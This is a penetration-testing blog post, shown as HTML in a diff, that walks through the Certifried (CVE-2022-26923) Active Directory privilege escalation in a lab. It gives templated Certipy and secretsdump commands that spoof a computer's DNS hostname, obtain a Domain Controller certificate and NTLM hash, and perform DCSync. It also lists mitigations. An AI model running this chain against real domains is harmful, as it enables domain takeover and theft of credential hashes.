@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>AD Pentesting Domain Privesc - Certifried (CVE-2022-26923) | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="AD Pentesting Domain Privesc - Certifried (CVE-2022-26923)" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" />
+<meta property="og:url" content="https://omnisl4sh.github.io/2022/05/13/Certifried.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-05-13T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="AD Pentesting Domain Privesc - Certifried (CVE-2022-26923)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-13T00:00:00+02:00","datePublished":"2022-05-13T00:00:00+02:00","headline":"AD Pentesting Domain Privesc - Certifried (CVE-2022-26923)","mainEntityOfPage":{"@type":"WebPage","@id":"https://omnisl4sh.github.io/2022/05/13/Certifried.html"},"url":"https://omnisl4sh.github.io/2022/05/13/Certifried.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="https://omnisl4sh.github.io/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-05-13T00:00:00+02:00" itemprop="datePublished">May 13, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
+
+<h1 id="the-attack-in-brief">The Attack In Brief</h1>
+<ol>
+  <li>AD Certificates can be used for authentication.</li>
+  <li>Certificates can be generated from <strong>templates</strong> in a <strong>Certificate Signing Request</strong> (CSR).</li>
+  <li>There are <strong>two</strong> types of templates available in <strong>ADCS</strong> by default: User and Computer.</li>
+  <li>Those templates are <strong>accessible to anyone</strong> in the <code class="language-plaintext highlighter-rouge">Domain Users</code> or <code class="language-plaintext highlighter-rouge">Domain Computers</code> groups.</li>
+  <li>Those templates <strong>allow the certificate holder to authenticate</strong> with them.</li>
+  <li><em>When generating a certificate for a computer object</em>, the template will check its <code class="language-plaintext highlighter-rouge">DNSHostname</code> property and <strong>will generate the certificate based on that</strong>.</li>
+  <li><strong>Meaning:</strong> <em>if the computer’s</em> <code class="language-plaintext highlighter-rouge">DNSHostname</code> <em>says it’s a Domain Controller,</em> you will get a certificate for a <strong>Domain Controller!</strong></li>
+  <li><em>By default,</em> <strong>any authenticated user</strong> can join up to 10 computers to the domain.</li>
+  <li><em>When a user joins a computer to the domain,</em> he can modify its <code class="language-plaintext highlighter-rouge">DNSHostname</code> property.</li>
+  <li><em>Combining points above,</em> a user can <em>spoof</em> the <code class="language-plaintext highlighter-rouge">DNSHostname</code> to <em>forge</em> a certificate as a <strong>Domain Controller</strong>.</li>
+  <li><em>With a Domain Controller’s certificate,</em> the user <em>can obtain</em> the computer account’s <strong>NTLM</strong> hash.</li>
+  <li><em>And with that hash,</em> he can <em>impersonate</em> a legit <strong>Domain Controller</strong> and <em>request a full copy of the domain’s hashes</em> (a.k.a <strong>perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack</strong>).</li>
+</ol>
+
+<hr />
+
+<h1 id="tools-needed">Tools Needed</h1>
+<ol>
+  <li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+  <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
+</ol>
+
+<hr />
+
+<h1 id="lab-setup-and-conditions">Lab Setup And Conditions</h1>
+<h2 id="1-domain-controller-with-adcs-role-installed-dclablocal-192168126129">1. Domain Controller with ADCS Role installed [DC.LAB.Local: 192.168.126.129]</h2>
+<p><img src="/assets/Certifried/dc-with-adcs-installed.jpg" alt="dc-with-adcs-installed" /></p>
+
+<h2 id="2-kali-192168145128">2. Kali [192.168.145.128]</h2>
+<p><img src="/assets/Certifried/kali-machine.jpg" alt="kali-machine" /></p>
+
+<h2 id="3-normal-user-account-no-special-privileges">3. Normal User Account (No Special Privileges)</h2>
+<p><img src="/assets/Certifried/normal-ad-user.jpg" alt="normal-ad-user" /></p>
+
+<hr />
+
+<h1 id="attack-demonstration">Attack Demonstration</h1>
+<h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed <code class="language-plaintext highlighter-rouge">DNSHostname</code></h2>
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; -user '&lt;NEW_COMPUTER_NAME&gt;' -dns &lt;DC_FQDN&gt;</code></p>
+
+<p><img src="/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg" alt="creating-computer-with-spoofed-dns-hostname" /></p>
+
+<p><img src="/assets/Certifried/proof-of-dns-hostname-spoofing.jpg" alt="proof-of-dns-hostname-spoofing" /></p>
+
+<h2 id="2-requesting-a-domain-controllers-certificate">2. Requesting A Domain Controller’s Certificate</h2>
+<p>we must first obtain the certificate authority’s name.</p>
+
+<p>This can be done by visiting the <code class="language-plaintext highlighter-rouge">/certsrv</code> web directory on the server with ADCS installed and authenticating.</p>
+
+<p><img src="/assets/Certifried/finding-out-the-ca-name.jpg" alt="finding-out-the-ca-name" /></p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy req -dc-ip &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -ca &lt;CA_NAME&gt; -template Machine</code></p>
+
+<p>Pssword = the same password generated from the computer creation in the previous step</p>
+
+<p><img src="/assets/Certifried/requesting-dc-cert.jpg" alt="requesting-dc-cert" /></p>
+
+<h2 id="3-using-the-domain-controllers-certificate-to-get-its-ntlm-hash">3. Using the Domain Controller’s Certificate To Get its NTLM Hash</h2>
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy auth -pfx &lt;GENERATED_PFX_CERTIFICATE&gt;</code></p>
+
+<p><img src="/assets/Certifried/got-nt-hash-for-dc.jpg" alt="got-nt-hash-for-dc" /></p>
+
+<h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing <code class="language-plaintext highlighter-rouge">DCsync</code> As The Impersonated Domain Controller</h2>
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">secretsdump.py -just-dc &lt;DOMAIN_FQDN&gt;/'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -hashes :&lt;RETRIEVED_HASH&gt;</code></p>
+
+<p><img src="/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg" alt="dc-sync-with-dc-ntlm-hash" /></p>
+
+<hr />
+
+<h1 id="mitigation">Mitigation</h1>
+<ol>
+  <li>Applying the patch released by Microsoft <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">here</a>.</li>
+  <li>Reducing certificate template permissions.</li>
+  <li>Reducing the default user’s machine quota to zero. Only Administrators should have this privilege.</li>
+</ol>
+
+<hr />
+
+<h1 id="references-and-credits">References and Credits</h1>
+<ul>
+  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
+  <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered and reported the vulnerability and created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
+  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
+</ul>
+
+  </div><a class="u-url" href="/2022/05/13/Certifried.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
